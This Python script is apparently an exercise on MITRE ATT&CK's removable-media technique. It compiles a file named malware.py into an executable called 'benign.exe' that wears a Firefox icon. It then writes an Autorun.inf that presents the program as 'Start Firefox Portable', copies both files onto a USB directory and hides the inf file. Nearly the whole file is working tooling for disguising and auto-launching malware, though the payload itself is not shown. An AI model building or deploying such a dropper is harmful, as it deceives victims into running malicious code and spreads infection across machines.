# intial Access Tactic in Mitre Attack
# Replication Through Removable Media Technique

# USB Auto Run program
# USB autorun is not always a viable infection vector for Windows 
#   because autorun is disabled by default in Windows 10.


# pip install pyinstaller

import PyInstaller.__main__
import shutil
import os

filename = "malware.py"
exename = "benign.exe"
icon = "firefox.ico"

pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE File")

# To Create Excutable From python script
PyInstaller.__main__.run(
    [
        "malware.py",
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exename,
        "--icon=" + icon,
    ]
)

print("Created Successfully.")

# Cleaning Up
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
# shutil.rmtree("__pycache__")
os.remove(exename + ".spec")


print("Creating Auto Run File")

# Some default config keys for autorun.inf file
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open=" + exename + "\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon=" + exename + "\n")

print("Setting Up USB")

# Move files to usb and make it hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir) 

# win cmd -> attrib :  set the hidden attribute for a file or directory.
print("attrib +h " + os.path.join(usbdir, "Autorun.inf"))
os.system("attrib +h " + os.path.join(usbdir, "Autorun.inf"))